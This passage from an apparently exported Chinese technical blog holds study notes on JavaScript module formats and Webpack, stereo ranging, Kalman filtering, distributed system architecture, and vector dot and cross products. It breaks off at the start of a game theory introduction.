定义为普通Node模块</span><br><span class="line">    module.exports &#x3D; definition();</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    &#x2F;&#x2F; 将模块的执行结果挂在window变量中，在浏览器中this指向window对象</span><br><span class="line">    this[name] &#x3D; definition();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;)(&#39;hello&#39;, function () &#123;</span><br><span class="line">  var hello &#x3D; function () &#123;&#125;;</span><br><span class="line">  return hello;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h1 id="Webpack兼容所有JS模块规范"><a href="#Webpack兼容所有JS模块规范" class="headerlink" title="Webpack兼容所有JS模块规范"></a>Webpack兼容所有JS模块规范</h1><p>webpack根据webpack.config.js中的入口文件，在入口文件里识别模块依赖，不管这里的模块依赖是用CommonJS写的，还是ES6 Module规范写的，webpack会自动进行分析，并通过转换、编译代码，打包成最终的文件。最终文件中的模块实现是基于webpack自己实现的webpack_require（es5代码），所以打包后的文件可以跑在浏览器上。</p>
<p>同时以上意味着在webapck环境下，你可以只使用ES6 模块语法书写代码（通常我们都是这么做的），也可以使用CommonJS模块语法，甚至可以两者混合使用。因为从webpack2开始，内置了对ES6、CommonJS、AMD 模块化语句的支持，webpack会对各种模块进行语法分析，并做转换编译。</p>
<p>具体Webpack兼容所有JS模块规范的原理分析参见<a href="https://juejin.im/post/5c94a2f36fb9a070fc623df4" target="_blank" rel="noopener">Webpack 模块打包原理</a>。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://i.jakeyu.top/2017/09/14/兼容前后端共用模块代码/" target="_blank" rel="noopener">兼容前后端共用模块代码(摘自《深入浅出Node.js》)</a>, by Jake.</li>
<li><a href="https://segmentfault.com/a/1190000011633813" target="_blank" rel="noopener">兼容多种模块规范(AMD,CMD,Node)的代码</a>, by CodeMan.</li>
<li><a href="http://justineo.github.io/singles/writing-modular-js/" target="_blank" rel="noopener">使用 AMD、CommonJS 及 ES Harmony 编写模块化的 JavaScript</a>, by ADDY OSMANI.</li>
<li><a href="http://www.hangge.com/blog/cache/detail_1686.html" target="_blank" rel="noopener">JS - CommonJS、ES2015、AMD、CMD模块规范对比与介绍（附样例）</a>,by hangge.</li>
<li><a href="https://babeljs.io/docs/en/" target="_blank" rel="noopener">What is Babel?</a>,by Babel.</li>
<li><a href="https://webpack.js.org/concepts/" target="_blank" rel="noopener">Webpack Concepts</a>,by webpack.</li>
<li><a href="https://segmentfault.com/a/1190000012386576" target="_blank" rel="noopener">import、require、export、module.exports 混合使用详解</a>,by lv_DaDa.</li>
<li><a href="https://juejin.im/post/5c94a2f36fb9a070fc623df4" target="_blank" rel="noopener">Webpack 模块打包原理</a>,by lq782655835.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title>双目测距笔记</title>
    <url>/2022/05/27/%E5%8F%8C%E7%9B%AE%E6%B5%8B%E8%B7%9D%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>双目测距实际操作分4个步骤：相机标定——双目校正——双目匹配——计算深度信息。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://cloud.tencent.com/developer/article/1824593" target="_blank" rel="noopener">一篇文章认识《双目立体视觉》</a>,by 一颗小树x.</li>
<li><a href="https://blog.csdn.net/piaoxuezhong/article/details/79016615" target="_blank" rel="noopener">双目视觉测距原理，数学推导及三维重建资源</a>,by Naruto_Q.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>卡尔曼滤波入门</title>
    <url>/2019/06/04/%E5%8D%A1%E5%B0%94%E6%9B%BC%E6%BB%A4%E6%B3%A2%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>卡尔曼滤波（Kalman filter）是一种高效率的递归滤波器（自回归滤波器），它能够从一系列的不完全及包含噪声的测量中，估计动态系统的状态。卡尔曼滤波会根据各测量量在不同时间下的值，考虑各时间下的联合分布，再产生对未知变数的估计，因此会比只以单一测量量为基础的估计方式要准。卡尔曼滤波得名自主要贡献者之一的鲁道夫·卡尔曼。</p>
<p>卡尔曼滤波在技术领域有许多的应用。常见的有飞机及太空船的导引、导航及控制。卡尔曼滤波也广为使用在时间序列的分析中，例如信号处理及计量经济学中。卡尔曼滤波也是机器人运动规划及控制的重要主题之一，有时也包括在轨迹最佳化。卡尔曼滤波也用在中轴神经系统运动控制的建模中。因为从给与运动命令到收到感觉神经的回授之间有时间差，使用卡尔曼滤波有助于建立符合实际的系统，估计运动系统的目前状态，并且更新命令。</p>
<h1 id="卡尔曼滤波原理解析"><a href="#卡尔曼滤波原理解析" class="headerlink" title="卡尔曼滤波原理解析"></a>卡尔曼滤波原理解析</h1><p>卡尔曼滤波器的状态矩阵方程如图1所示。</p>
<p align="center">
    <img src="images/kfmEquation.jpg" width="90%" alt="卡尔曼滤波器的状态矩阵方程"/>
</p>
<center>图1  卡尔曼滤波器的状态矩阵方程</center>

<p>其中，下角标上的k是状态。此处我们将其视为离散时间间隔，比如说k=1 代表 1ms, k=2 代表2ms。</p>
<p>我们的目的是找到信号 $x$ 的估值 $\hat{x} $，并且希望能对所有的k值都能找到对应的估值。</p>
<p>另外此处的 $Z_k$ 是实际测量值，记住我们对该值并不完全信任，否则我们也不用费这么多事了。 $K_k$ 称为<strong>卡尔曼增益</strong>（也是最重要的量）， $\hat{x}_k$ 是前一状态下的信号估值。</p>
<p>现在我们有了测量值，前一状态的信号估值。该方程中唯一未知的量就是卡尔曼增益 $K_k$ 了。对于每个状态，我们都需要计算对应的。这事不简单，但好在我们有所需的计算工具。</p>
<p>另一方面，假设 $K_k$ 等于0.5，我们会发现该式变成了一个简单的求平均值公式。换句话说，随着状态的变化，我们的 $K_k$ 值将越来越“聪明”。</p>
<h1 id="卡尔曼滤波器的构造"><a href="#卡尔曼滤波器的构造" class="headerlink" title="卡尔曼滤波器的构造"></a>卡尔曼滤波器的构造</h1><h2 id="建立模型"><a href="#建立模型" class="headerlink" title="建立模型"></a>建立模型</h2><p>此步最为关键，你必须确保卡尔曼滤波器适用于你要解决的问题。</p>
<p>卡尔曼滤波器的两个方程如下:</p>
<p>$$x_k=Ax_{k-1}+Bu_k+w_{k-1} \tag{1}$$<br>$$z_k=Hx_k+v_k \tag{2}$$</p>
<p>式(1)表达的是每个 $x_k$ 都可以通过一个线性随机方程估计出来。任意 $x_k$ 都是其前一时刻的值与<strong>过程噪音</strong>的线性组合（这个很难概念化）。请记住，大部分情况下该式没有控制信号 $u_k$ 项。</p>
<p>式(2)告诉我们任何测量值 $z_k$ （无法确定精确与否的测量值）都是信号值与<strong>测量噪声</strong>的线性组合。这两个分量符合高斯分布。</p>
<p>过程噪声与测量噪声互相统计独立。</p>
<p>$A, B, H$ 是一般形式的矩阵。但在大多数信号处理问题中，这些量仅为数值。而且虽然这些值在状态变换时会改变，大多数情况下我们都可以假设他们为定值。</p>
<p>如果我们十分确定我们的系统符合此模型，那么唯一剩下要做的事就是估计噪音函数 $w_{k-1}$ 和 $v_k$ 的平均值以及标准差。我们知道，在实际生活中没有信号满足高斯分布，但我们可以近似其为高斯分布。</p>
<p>该近似问题不大，因为我们将看到卡尔曼滤波器算法会逐渐向正确的（噪音函数的）估计值收敛，即使高斯噪声参数估计不佳。</p>
<p>唯一需要记住的是：你估计出来的噪音参数越好（越接近实际），你估计的（输出真实值）就越好。</p>
<h2 id="开始卡尔曼滤波"><a href="#开始卡尔曼滤波" class="headerlink" title="开始卡尔曼滤波"></a>开始卡尔曼滤波</h2><p>如果你的模型适用于卡尔曼滤波器，那么接下来的步骤就是决定一些必要的参数以及初始值。</p>
<p>卡尔曼滤波器包含的方程可分为两个方程集：时间更新方程组（用于预测）以及测量更新方程组（用于修正）。这两个方程组在滤波器运行的每一步（每个状态）下都会执行，如图2所示。</p>
<p align="center">
    <img src="images/kfmStep2.jpg" width="70%" alt="卡尔曼滤波的两个步骤"/>
</p>
<center>图2  卡尔曼滤波的两个步骤</center>

<p>建模部分已经在步骤一完成了，所以矩阵A，B和H已知。这些矩阵很可能是一个常数，而且大部分情况下会等于1。</p>
<p>剩下的最让人难受的部分就是决定R和Q的值了。R的值还是很容易找的，因为一般情况下我们对环境中的噪音还是能够确认的。（起码能用仪器测一下）。但是找Q的值就没那么直观了。</p>
<p>为了使滤波器能够运行，我们需要知道 $x_0$ 和 $P_0$ 的估计值。</p>
<h2 id="迭代"><a href="#迭代" class="headerlink" title="迭代"></a>迭代</h2><p>在获得了滤波器运行所需的所有信息后，我们就可以估值迭代了。记住：前一状态的估值将成为当前状态的输入。</p>
<p align="center">
    <img src="images/kfmStep3.jpg" width="70%" alt="卡尔曼滤波的迭代运行"/>
</p>
<center>图3  卡尔曼滤波的迭代运行</center>

<p>此处 $\hat{x}_k^-$ 是<strong>预估值</strong>，从某种角度来说是第二部分运行前对 x 的一个粗略估计值。</p>
<p>同时 $P_k^-$ 叫做预估误差协方差。在第二步“测量更新”中我们将会用到这两个预估值。</p>
<p>$\hat{x}_k$为在时间 k 时的 x 的估计值。（也是我们最想获得的值）。同时，我们得到了用于k+1时刻计算的 $P_k$ 值。</p>
<p>下一次迭代不会用到我们求得的卡尔曼增益 $K_k$ 的值，该值隐藏而神秘，并且是这些方程集的最重要的部分。</p>
<p>我们在第二步“测量更新”中求得的值也叫做后部值(posterior values)。这个名称也很说得通。</p>
<h1 id="卡尔曼滤波器的应用示例"><a href="#卡尔曼滤波器的应用示例" class="headerlink" title="卡尔曼滤波器的应用示例"></a>卡尔曼滤波器的应用示例</h1><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zhuanlan.zhihu.com/p/36745755" target="_blank" rel="noopener">卡尔曼滤波：从入门到精通</a>,by David LEE.</li>
<li><a href="https://zhuanlan.zhihu.com/p/64539108" target="_blank" rel="noopener">傻瓜也能懂的卡尔曼滤波器（翻译自外网博客）</a>,by 彦鑫.</li>
<li><a href="https://zhuanlan.zhihu.com/p/25598462" target="_blank" rel="noopener">说说卡尔曼滤波</a>,by 李阳.</li>
<li><a href="https://zh.wikipedia.org/wiki/%E5%8D%A1%E5%B0%94%E6%9B%BC%E6%BB%A4%E6%B3%A2" target="_blank" rel="noopener">卡尔曼滤波</a>,by wikipedia.</li>
<li><a href="https://zhuanlan.zhihu.com/p/39912633" target="_blank" rel="noopener">图说卡尔曼滤波，一份通俗易懂的教程</a>,by 论智.</li>
<li><a href="http://blog.itpub.net/70024922/viewspace-2933256/" target="_blank" rel="noopener">时间序列基本概念、任务、预测方法</a>,by 带你聊技术.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>分布式系统架构入门</title>
    <url>/2019/02/01/%E5%88%86%E5%B8%83%E5%BC%8F%E7%B3%BB%E7%BB%9F%E6%9E%B6%E6%9E%84%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>随着互联网高速公路的不断发展，以往的单机应用系统逐渐没落，分布式系统逐渐成为主流。</p>
<h1 id="分布式系统定义"><a href="#分布式系统定义" class="headerlink" title="分布式系统定义"></a>分布式系统定义</h1><p>分布式系统是其组件分布正在连网的计算机上，组件之间通过传递消息进行通信和动作协调的系统<sup>[1]</sup>。通过该定义可知，分布式系统具有以下重要特征：组件的并发性、缺乏全局时钟、组件故障的独立性。</p>
<p>现代分布式系统的例子有：</p>
<ul>
<li>Web搜索</li>
<li>大型多人在线游戏</li>
<li>金融交易</li>
</ul>
<h1 id="分布式系统架构演变"><a href="#分布式系统架构演变" class="headerlink" title="分布式系统架构演变"></a>分布式系统架构演变</h1><p>大多数的开发者最开始接触的是单机系统架构，即所有的数据和程序都在一台计算机上，这是分布式系统架构演变的起点。随着用户规模的不断增长和用户需求的不断变化，分布式系统架构开始不断演变。</p>
<h2 id="系统架构演化历程-初始阶段架构"><a href="#系统架构演化历程-初始阶段架构" class="headerlink" title="系统架构演化历程-初始阶段架构"></a>系统架构演化历程-初始阶段架构</h2><p align="center">
    <img src="images/dsa1.png" width="90%" alt="系统架构演化历程-初始阶段架构"/>
</p>

<p>初始阶段的小型系统中应用程序、数据库、文件等所有的资源都在一台服务器上。随着业务量的增长，小型系统的负载将越来越重。但如果没有达到单台机器的性能瓶颈，则根本没必要进行分布式架构，可以考虑机器升级，提高机器配置解决问题。或者考虑技术升级，更换更加高效或者场景适合的技术。</p>
<h2 id="系统架构演化历程-应用服务和数据服务分离"><a href="#系统架构演化历程-应用服务和数据服务分离" class="headerlink" title="系统架构演化历程-应用服务和数据服务分离"></a>系统架构演化历程-应用服务和数据服务分离</h2><p align="center">
    <img src="images/dsa2.png" width="90%" alt="系统架构演化历程-应用服务和数据服务分离"/>
</p>

<p>数据量增加，单台服务器性能及存储空间不足，需要将应用和数据分离，并发处理能力和数据存储空间得到了很大改善。</p>
<h2 id="系统架构演化历程-使用缓存改善性能"><a href="#系统架构演化历程-使用缓存改善性能" class="headerlink" title="系统架构演化历程-使用缓存改善性能"></a>系统架构演化历程-使用缓存改善性能</h2><p align="center">
    <img src="images/dsa3.jpg" width="90%" alt="系统架构演化历程-使用缓存改善性能"/>
</p>

<p>系统访问特点遵循二八定律，即80%的业务访问集中在20%的数据上。缓存分为本地缓存和远程分布式缓存，本地缓存访问速度更快但缓存数据量有限，同时存在与应用程序争用内存的情况。</p>
<h2 id="系统架构演化历程-使用应用服务器集群"><a href="#系统架构演化历程-使用应用服务器集群" class="headerlink" title="系统架构演化历程-使用应用服务器集群"></a>系统架构演化历程-使用应用服务器集群</h2><p align="center">
    <img src="images/dsa4.jpg" width="90%" alt="系统架构演化历程-使用应用服务器集群"/>
</p>

<p>使用集群是系统解决高并发、海量数据问题的常用手段。通过向集群中追加资源，提升系统的并发处理能力，使得服务器的负载压力不再成为整个系统的瓶颈。</p>
<h2 id="系统架构演化历程-数据库读写分离"><a href="#系统架构演化历程-数据库读写分离" class="headerlink" title="系统架构演化历程-数据库读写分离"></a>系统架构演化历程-数据库读写分离</h2><p align="center">
    <img src="images/dsa5.jpg" width="90%" alt="系统架构演化历程-数据库读写分离"/>
</p>

<p>数据库访问通常是读多写少。针对这个情况，就是写一个主库，但是主库挂多个从库，然后从多个从库来读，以支撑更高的读并发压力。</p>
<h2 id="系统架构演化历程-反向代理和CDN加速"><a href="#系统架构演化历程-反向代理和CDN加速" class="headerlink" title="系统架构演化历程-反向代理和CDN加速"></a>系统架构演化历程-反向代理和CDN加速</h2><p align="center">
    <img src="images/dsa6.jpg" width="90%" alt="系统架构演化历程-反向代理和CDN加速"/>
</p>

<p>为了应付复杂的网络环境和不同地区用户的访问，通过CDN和反向代理加快用户访问的速度，同时减轻后端服务器的负载压力。CDN与反向代理的基本原理都是缓存。</p>
<h2 id="系统架构演化历程-分布式文件系统和分布式数据库"><a href="#系统架构演化历程-分布式文件系统和分布式数据库" class="headerlink" title="系统架构演化历程-分布式文件系统和分布式数据库"></a>系统架构演化历程-分布式文件系统和分布式数据库</h2><p align="center">
    <img src="images/dsa7.jpg" width="90%" alt="系统架构演化历程-分布式文件系统和分布式数据库"/>
</p>

<p>任何强大的单一服务器都满足不了大型系统持续增长的业务需求，数据库读写分离随着业务的发展最终也将无法满足需求，需要使用分布式数据库及分布式文件系统来支撑。分布式数据库是系统数据库拆分的最后方法，只有在单表数据规模非常庞大的时候才使用，更常用的数据库拆分手段是业务分库，将不同的业务数据库部署在不同的物理服务器上。</p>
<h2 id="系统架构演化历程-使用NoSQL和搜索引擎"><a href="#系统架构演化历程-使用NoSQL和搜索引擎" class="headerlink" title="系统架构演化历程-使用NoSQL和搜索引擎"></a>系统架构演化历程-使用NoSQL和搜索引擎</h2><p align="center">
    <img src="images/dsa8.jpg" width="90%" alt="系统架构演化历程-使用NoSQL和搜索引擎"/>
</p>

<p>随着业务越来越复杂，对数据存储和检索的需求也越来越复杂，系统需要采用一些非关系型数据库如NoSQL和分数据库查询技术如搜索引擎。应用服务器通过统一数据访问模块访问各种数据，减轻应用程序管理诸多数据源的麻烦。</p>
<h2 id="系统架构演化历程-业务拆分"><a href="#系统架构演化历程-业务拆分" class="headerlink" title="系统架构演化历程-业务拆分"></a>系统架构演化历程-业务拆分</h2><p align="center">
    <img src="images/dsa9.jpg" width="90%" alt="系统架构演化历程-业务拆分"/>
</p>

<p>为了应对日益复杂的业务场景，通常使用分而治之的手段将整个系统业务分成不同的产品线，应用之间通过超链接建立关系，也可以通过消息队列进行数据分发，当然更多的还是通过访问同一个数据存储系统来构成一个关联的完整系统。</p>
<ul>
<li><p>纵向拆分：将一个大应用拆分为多个小应用，如果新业务较为独立，那么就直接将其设计部署为一个独立的Web应用系统纵向拆分相对较为简单，通过梳理业务，将较少相关的业务剥离即可。</p>
</li>
<li><p>横向拆分：将复用的业务拆分出来，独立部署为分布式服务，新增业务只需要调用这些分布式服务横向拆分需要识别可复用的业务，设计服务接口，规范服务依赖关系。</p>
</li>
</ul>
<h2 id="系统架构演化历程-分布式服务"><a href="#系统架构演化历程-分布式服务" class="headerlink" title="系统架构演化历程-分布式服务"></a>系统架构演化历程-分布式服务</h2><p align="center">
    <img src="images/dsa10.jpg" width="90%" alt="系统架构演化历程-分布式服务"/>
</p>

<h1 id="分布式服务关键技术"><a href="#分布式服务关键技术" class="headerlink" title="分布式服务关键技术"></a>分布式服务关键技术</h1><p>分布式服务应用将会面临以下问题：</p>
<ul>
<li>当服务越来越多时，服务URL配置管理变得非常困难，硬件负载均衡器的单点压力也越来越大。</li>
<li>当进一步发展，服务间依赖关系变得错踪复杂，甚至分不清哪个应用要在哪个应用之前启动，架构师都不能完整的描述应用的架构关系。</li>
<li>接着，服务的调用量越来越大，服务的容量问题就暴露出来，这个服务需要多少机器支撑？什么时候该加机器？</li>
<li>服务多了，沟通成本也开始上升，调某个服务失败该找谁？服务的参数都有什么约定？ </li>
<li>一个服务有多个业务消费者，如何确保服务质量？</li>
<li>随着服务的不停升级，总有些意想不到的事发生，比如cache写错了导致内存溢出，故障不可避免，每次核心服务一挂，影响一大片，人心慌慌，如何控制故障的影响面？服务是否可以功能降级？或者资源劣化？</li>
</ul>
<p>为解决上述问题，可采用以下关键技术。</p>
<h2 id="消息队列架构"><a href="#消息队列架构" class="headerlink" title="消息队列架构"></a>消息队列架构</h2><p>消息队列通过消息对象分解系统耦合性，不同子系统处理同一个消息。</p>
<p align="center">
    <img src="images/msgQueue.jpg" width="90%" alt="消息队列原理"/>
</p>

<h2 id="面向服务架构"><a href="#面向服务架构" class="headerlink" title="面向服务架构"></a>面向服务架构</h2><p>服务框架通过接口分解系统耦合性，不同子系统通过相同的接口描述进行服务启用服务框架是一个点对点模型服务框架面向同构系统适合：移动应用、互联网应用、外部系统。</p>
<p align="center">
    <img src="images/SOA.jpg" width="90%" alt="面向服务架构原理"/>
</p>

<h2 id="服务总线架构"><a href="#服务总线架构" class="headerlink" title="服务总线架构"></a>服务总线架构</h2><p>服务总线架构同面向服务架构一样，均是通过接口分解系统耦合性，不同子系统通过相同的接口描述进行服务启用。服务总线架构是一个总线式的架构模型。</p>
<p align="center">
    <img src="images/ESB.png" width="90%" alt="服务总线架构原理"/>
</p>

<h1 id="分布式系统交互的通信模式"><a href="#分布式系统交互的通信模式" class="headerlink" title="分布式系统交互的通信模式"></a>分布式系统交互的通信模式</h1><p>分布式系统交互的通信模式共有五种：</p>
<ul>
<li>request/response模式（同步模式）：客户端发起请求一直阻塞到服务端返回请求为止。</li>
<li>Callback（异步模式）：客户端发送一个RPC请求给服务器，服务端处理后再发送一个消息给消息发送端提供的callback端点，此类情况非常合适以下场景：A组件发送RPC请求给B，B处理完成后，需要通知A组件做后续处理。</li>
<li>Future模式：客户端发送完请求后，继续做自己的事情，返回一个包含消息结果的Future对象。客户端需要使用返回结果时，使用Future对象的.get(),如果此时没有结果返回的话，会一直阻塞到有结果返回为止。</li>
<li>Oneway模式：客户端调用完继续执行，不管接收端是否成功。</li>
<li>Reliable模式：为保证通信可靠，将借助于消息中心来实现消息的可靠送达，请求将做持久化存储，在接收方在线时做送达，并由消息中心保证异常重试。</li>
</ul>
<h1 id="常用的分布式服务框架"><a href="#常用的分布式服务框架" class="headerlink" title="常用的分布式服务框架"></a>常用的分布式服务框架</h1><p>现在业界比较成熟的服务框架有很多，比如：Hessian、CXF、Dubbo、Dubbox、Spring Cloud、gRPC、thrift等技术实现，都可以进行远程调用。</p>
<ul>
<li>Spring Cloud：Spring全家桶，用起来很舒服，只有你想不到，没有它做不到。可惜因为发布的比较晚，国内还没出现比较成功的案例，大部分都是试水，不过毕竟有Spring作背书，还是比较看好。</li>
<li>Dubbox：相对于Dubbo支持了REST，估计是很多公司选择Dubbox的一个重要原因之一，但如果使用Dubbo的RPC调用方式，服务间仍然会存在API强依赖，各有利弊，懂的取舍吧。</li>
<li>Thrift：如果你比较高冷，完全可以基于Thrift自己搞一套抽象的自定义框架吧。</li>
<li>Montan：可能因为出来的比较晚，目前除了新浪微博16年初发布的，</li>
<li>Hessian：如果是初创公司或系统数量还没有超过5个，推荐选择这个，毕竟在开发速度、运维成本、上手难度等都是比较轻量、简单的，即使在以后迁移至SOA，也是无缝迁移。</li>
<li>rpcx/gRPC：在服务没有出现严重性能的问题下，或技术栈没有变更的情况下，可能一直不会引入，即使引入也只是小部分模块优化使用。</li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li>George Coulouris, Jean Dollimore， Tim Kindberg，Gordon Blair，金蓓弘，马应龙，等译. 分布式系统概念与设计[M].2013.</li>
<li><a href="http://zhuanlan.51cto.com/art/201712/561516.htm" target="_blank" rel="noopener">聊聊分布式系统的架构套路</a>,by 大蕉.</li>
<li><a href="https://www.jianshu.com/p/ab35b6d74fed" target="_blank" rel="noopener">分布式架构的演进</a>,by 稳稳的幸福y.</li>
<li><a href="https://github.com/doocs/advanced-java" target="_blank" rel="noopener">互联网 Java 工程师进阶知识完全扫盲</a>,by dooc.</li>
<li><a href="https://juejin.im/post/5a5ee63d518825732914748c" target="_blank" rel="noopener">聊聊Dubbo（一）：为何选择</a>, by 猿码道.</li>
<li><a href="https://juejin.im/post/5d84e21f6fb9a06ac8248149" target="_blank" rel="noopener">“12306”的架构到底有多牛逼？</a>,by 绘你一世倾城.</li>
<li><a href="https://read.engineerscodex.com/p/how-pinterest-scaled-to-11-million" target="_blank" rel="noopener">How Pinterest scaled to 11 million users with only 6 engineers</a>,by engineerscodex.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>向量点积叉积及其几何意义</title>
    <url>/2019/01/05/%E5%90%91%E9%87%8F%E7%82%B9%E7%A7%AF%E5%8F%89%E7%A7%AF%E5%8F%8A%E5%85%B6%E5%87%A0%E4%BD%95%E6%84%8F%E4%B9%89/</url>
    <content><![CDATA[<p>在3D游戏开发中，经常用到向量的点积和叉积及其几何意义，为防止遗忘，在此记录一下。</p>
<h1 id="点积"><a href="#点积" class="headerlink" title="点积"></a>点积</h1><p>在数学中，<strong>点积</strong>（德语：Skalarprodukt、英语：Dot Product）又称数量积或标量积（德语：Skalarprodukt、英语：Scalar Product），是一种接受两个等长的数字序列（通常是坐标向量）、返回单个数字的代数运算。在欧几里得几何中，两个笛卡尔坐标向量的点积常称为内积（德语：inneres Produkt、英语：Inner Product），见内积空间。</p>
<h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>点积有两种定义方式：代数方式和几何方式。通过在欧氏空间中引入笛卡尔坐标系，向量之间的点积既可以由向量坐标的代数运算得出，也可以通过引入两个向量的长度和角度等几何概念来求解。</p>
<h3 id="代数定义"><a href="#代数定义" class="headerlink" title="代数定义"></a>代数定义</h3><p>两个向量  $\vec{a} = [a1, a2,…, an]$和  $\vec{b} = [b1, b2,…, bn]$的点积定义为：</p>
<p>$$\vec{a}\cdot \vec{b} = \sum_{i=1}^n a_ib_i = a_1b_1 + a_2b_2 + \cdots + a_nb_n$$<br>这里的Σ是求和符号，而n是向量空间的维数。</p>
<h3 id="几何定义"><a href="#几何定义" class="headerlink" title="几何定义"></a>几何定义</h3><p>在欧几里得空间中，点积可以直观地定义为</p>
<p>$$\vec{a} \cdot \vec{b} = |\vec{a}| , |\vec{b}| \cos \theta ;$$</p>
<p>这里 $|\vec{x}|$ 表示 $\vec{x}$的模（长度）， $\theta$ 表示两个向量之间的角度。</p>
<h1 id="叉积"><a href="#叉积" class="headerlink" title="叉积"></a>叉积</h1><p>在数学和向量代数领域，叉积（英语：Cross product）又称向量积（英语：Vector product），是对三维空间中的两个向量的二元运算，使用符号 $\times$。与点积不同，它的运算结果是向量。对于线性无关的两个向量 $\mathbf {a}$  和 $\mathbf {b}$ ，它们的叉积写作 ${\mathbf {a} \times \mathbf {b} }$，是 $\mathbf {a}$  和 $\mathbf {b}$ 所在平面的法线向量，与 $\mathbf {a}$ 和 $\mathbf {b}$ 都垂直。叉积被广泛运用于数学、物理、工程学、计算机科学领域。</p>
<h2 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h2><p>两个向量  $\mathbf {a}$  和  $\mathbf {b}$  的叉积仅在三维空间中有定义，写作  ${\displaystyle \mathbf {a} \times \mathbf {b} }$。在物理学中，叉积有时也被写成${\displaystyle \mathbf {a} \wedge \mathbf {b} }$，但在数学中 ${\displaystyle \mathbf {a} \wedge \mathbf {b} }$ 是外代数中的外积。</p>
<p>叉积 ${\displaystyle \mathbf {a} \times \mathbf {b} }$ 是与  $\mathbf {a}$  和  $\mathbf {b}$  都垂直的向量 $\mathbf {c}$ 。其方向由右手定则决定，模长等于以两个向量为边的平行四边形的面积。</p>
<p align="center">
    <img src="images/Right_hand_rule_cross_product.png" width="60%" alt="右手定则"/>
</p>

<p>叉积可以定义为：</p>
<p>$${\displaystyle \mathbf {a} \times \mathbf {b} =|\mathbf {a} ||\mathbf {b} |\sin(\theta )\ \mathbf {n} }$$</p>
<p>其中$\theta$  表示  $\mathbf {a}$  和  $\mathbf {b}$  在它们所定义的平面上的夹角（ ${\displaystyle 0^{\circ }\leq \theta \leq 180^{\circ }}$）。  ${\displaystyle |\mathbf {a} |}$ 和  ${\displaystyle |\mathbf {b} |}$ 是向量$\mathbf {a}$  和  $\mathbf {b}$  的模长，而  $\mathbf{n}$ 则是一个与  $\mathbf {a}$ 、 $\mathbf {b}$  所构成的平面垂直的单位向量，方向由右手定则决定。根据上述公式，当$\mathbf {a}$  与 $\mathbf {b}$  平行（即 $\theta$  为 0° 或 180°）时，它们的叉积为零向量  $\mathbf{0}$。</p>
<p align="center">
    <img src="images/Cross_product_vector.png" width="60%" alt="在右手坐标系中的向量积"/>
</p>

<h2 id="矩阵表示"><a href="#矩阵表示" class="headerlink" title="矩阵表示"></a>矩阵表示</h2><p>叉积可以表达为这样的行列式：</p>
<p>$${\displaystyle \mathbf {u\times v} ={\begin{vmatrix}\mathbf {i} &amp;\mathbf {j} &amp;\mathbf {k} \u_{1}&amp;u_{2}&amp;u_{3}\v_{1}&amp;v_{2}&amp;v_{3}\\end{vmatrix}}}$$</p>
<p>这个行列式可以使用萨吕法则或拉普拉斯展开计算。使用拉普拉斯展开可以沿第一行展开为：</p>
<p>$${\displaystyle {\begin{aligned}\mathbf {u\times v} &amp;={\begin{vmatrix}u_{2}&amp;u_{3}\v_{2}&amp;v_{3}\end{vmatrix}}\mathbf {i} -{\begin{vmatrix}u_{1}&amp;u_{3}\v_{1}&amp;v_{3}\end{vmatrix}}\mathbf {j} +{\begin{vmatrix}u_{1}&amp;u_{2}\v_{1}&amp;v_{2}\end{vmatrix}}\mathbf {k} \&amp;=(u_{2}v_{3}-u_{3}v_{2})\mathbf {i} -(u_{1}v_{3}-u_{3}v_{1})\mathbf {j} +(u_{1}v_{2}-u_{2}v_{1})\mathbf {k} \end{aligned}}}$$<br>可以直接得到结果向量。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://zh.wikipedia.org/wiki/叉积" target="_blank" rel="noopener">叉积</a>, by wikipedia.</li>
<li><a href="https://zh.wikipedia.org/wiki/点积" target="_blank" rel="noopener">数量积</a>, by wikipedia.</li>
<li><a href="https://blog.csdn.net/dcrmg/article/details/52416832" target="_blank" rel="noopener">向量点乘（内积）和叉乘（外积、向量积）概念及几何意义解读</a>, by -牧野-.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
      </tags>
  </entry>
  <entry>
    <title>博弈论简介</title>
    <url>/2019/02/26/%E5%8D%9A%E5%BC%88%E8%AE%BA%E7%AE%80%E4%BB%8B/</url>
    <content><![CDATA[<p>博弈论（英语：game theory），又译为对策论，经济学的一个分支，1944年冯·诺伊曼与奥斯卡·摩根斯特恩合著《博弈论与经济行为》，标志着现代系统博弈理论的的初步形成，因此他被称为“博弈论之父”。博弈论被认为是20世纪经济学最伟大的成果之一。目前在生物学、经济学、国际关系、计算机科学、政治学、军事战略和其他很多学科都有广泛的应用。</p>
<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>博弈论考虑游戏中的个体的预测行为和实际行为，并研究它们的优化策略。表面上不同的相互作用可能表现出相似的激励结构（incentive structure），所以它们是同一个游戏的特例。其中一个有名有趣的应用例子是囚徒困境。</p>
